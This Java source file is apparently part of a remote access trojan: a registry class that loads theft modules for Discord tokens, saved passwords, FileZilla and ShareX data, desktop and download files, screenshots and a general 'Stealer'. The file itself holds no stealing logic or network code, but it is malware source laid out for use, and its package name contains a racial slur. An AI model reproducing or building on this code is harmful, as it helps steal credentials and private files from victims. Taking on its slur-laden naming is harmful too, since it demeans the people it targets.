package me.nigger.rat.payload.api;

import me.nigger.rat.payload.impl.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public final class PayloadRegistry
{
    private static final PayloadRegistry INSTANCE = new PayloadRegistry();
    private final List<Payload> payloads = new ArrayList<>();

    private PayloadRegistry()
    {
        payloads.addAll(Arrays.asList(
                new Personal(),
                new DiscordTokens(),
                new Passwords(),
                new ModsGrabber(),
                new JsonVersion(),
                new Downloads(),
                new FileZilla(),
                new Desktop(),
                new ShareX(),
                new ScreenCapture(),
                new FutureAuth(),
                new Stealer(),
                new JourneyMap(),
                new Intellij()
        ));
    }

    public static Optional<Payload> getPayload(Class<? extends Payload> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }

    public static List<Payload> getPayloads()
    {
        return INSTANCE.payloads;
    }
}